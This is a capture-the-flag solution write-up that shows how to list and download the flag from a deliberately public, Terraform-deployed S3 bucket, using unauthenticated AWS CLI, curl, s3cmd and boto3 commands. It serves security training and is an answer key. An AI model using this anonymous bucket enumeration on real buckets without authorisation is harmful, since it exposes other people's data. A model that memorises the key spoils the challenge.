# Challenge 01 - AWS Public Storage Solution

## Challenge Solution

### Step-by-Step for Candidates

Once you have the Terraform deployment outputs, follow these steps to enumerate the S3 bucket and obtain the flag:

#### Available Information
Based on Terraform outputs, you have:
```
aws_flag_url = "http://ctf-25-website-c7b06639.s3-website-us-east-1.amazonaws.com/flag.txt"
aws_s3_bucket_name = "ctf-25-website-c7b06639"
aws_s3_website_endpoint = "http://ctf-25-website-c7b06639.s3-website-us-east-1.amazonaws.com"
```

#### Method 1: Enumeration with AWS CLI (Recommended)

**Step 1: List bucket objects**
```bash
# List all objects in the public bucket
aws s3 ls s3://ctf-25-website-c7b06639 --no-sign-request

# Expected output:
# 2024-01-15 10:30:45        123 flag.txt
# 2024-01-15 10:30:45       1024 index.html
```

**Step 2: Download and view the flag content**
```bash
# Download the flag directly to stdout
aws s3 cp s3://ctf-25-website-c7b06639/flag.txt - --no-sign-request

# Or download to a local file
aws s3 cp s3://ctf-25-website-c7b06639/flag.txt ./flag.txt --no-sign-request
cat flag.txt
```

**Step 3: Check other files (optional)**
```bash
# View the content of index.html
aws s3 cp s3://ctf-25-website-c7b06639/index.html - --no-sign-request
```

#### Method 2: Direct Web Access

**Step 1: Access the website**
```bash
# Use curl to access the web endpoint
curl http://ctf-25-website-c7b06639.s3-website-us-east-1.amazonaws.com

# Or open in browser
open http://ctf-25-website-c7b06639.s3-website-us-east-1.amazonaws.com
```

**Step 2: Access the flag directly**
```bash
# Download the flag via HTTP
curl http://ctf-25-website-c7b06639.s3-website-us-east-1.amazonaws.com/flag.txt

# Or use wget
wget -O - http://ctf-25-website-c7b06639.s3-website-us-east-1.amazonaws.com/flag.txt
```

#### Method 3: Enumeration with Third-party Tools

**Using s3cmd:**
```bash
# Install s3cmd if not available
pip install s3cmd

# List objects (anonymous configuration)
s3cmd ls s3://ctf-25-website-c7b06639 --no-ssl

# Download flag
s3cmd get s3://ctf-25-website-c7b06639/flag.txt --no-ssl
```

**Using boto3 (Python):**
```python
import boto3
from botocore import UNSIGNED
from botocore.config import Config

# S3 client without authentication
s3 = boto3.client('s3', config=Config(signature_version=UNSIGNED))

# List objects
response = s3.list_objects_v2(Bucket='ctf-25-website-c7b06639')
for obj in response.get('Contents', []):
    print(f"{obj['Key']} - {obj['Size']} bytes")

# Download flag
response = s3.get_object(Bucket='ctf-25-website-c7b06639', Key='flag.txt')
flag_content = response['Body'].read().decode('utf-8')
print(f"Flag: {flag_content}")
```

#### Method 4: Manual Enumeration with Browser

1. **Access the bucket via browser:**
   - URL: `http://ctf-25-website-c7b06639.s3-website-us-east-1.amazonaws.com`
   - Explore available content

2. **Direct access to the flag:**
   - URL: `http://ctf-25-website-c7b06639.s3-website-us-east-1.amazonaws.com/flag.txt`

### Verification Commands

**Verify bucket permissions:**
```bash
# Try to get the bucket policy
aws s3api get-bucket-policy --bucket ctf-25-website-c7b06639 --no-sign-request

# Verify website configuration
aws s3api get-bucket-website --bucket ctf-25-website-c7b06639 --no-sign-request

# Verify bucket ACL
aws s3api get-bucket-acl --bucket ctf-25-website-c7b06639 --no-sign-request
```

### Flag Format
```
CLD[UUID]
```

### Learning Points

1. **Public S3 buckets**: Buckets with public access policies allow enumeration without authentication
2. **Website hosting**: Buckets configured as static websites are accessible via HTTP
3. **Enumeration**: Multiple methods to access content (AWS CLI, curl, browser, third-party tools)
4. **No authentication**: The `--no-sign-request` flag allows anonymous access to public resources

## Enumeration Troubleshooting

### Common Issues

**Error: "NoSuchBucket" when enumerating**
```bash
# Verify that the bucket exists
aws s3api head-bucket --bucket ctf-25-website-c7b06639 --no-sign-request

# If it fails, check the exact bucket name in Terraform outputs
terraform output aws_s3_bucket_name
```

**Error: "Access Denied" during enumeration**
```bash
# Verify if the bucket allows public access
aws s3api get-bucket-policy --bucket ctf-25-website-c7b06639 --no-sign-request

# Try direct web access if AWS CLI fails
curl -I http://ctf-25-website-c7b06639.s3-website-us-east-1.amazonaws.com
```

**Error: "SSL Certificate" with third-party tools**
```bash
# For s3cmd, use --no-ssl
s3cmd ls s3://ctf-25-website-c7b06639 --no-ssl

# For curl, use --insecure if necessary
curl --insecure http://ctf-25-website-c7b06639.s3-website-us-east-1.amazonaws.com/flag.txt
```

**Timeout or slow connection**
```bash
# Verify basic connectivity
ping s3.amazonaws.com

# Use specific region if there are issues
aws s3 ls s3://ctf-25-website-c7b06639 --region us-east-1 --no-sign-request
```

**Flag not found**
```bash
# List all objects to verify structure
aws s3 ls s3://ctf-25-website-c7b06639 --recursive --no-sign-request

# Check if the flag is in subdirectories
aws s3 ls s3://ctf-25-website-c7b06639/ --recursive --no-sign-request | grep -i flag
```
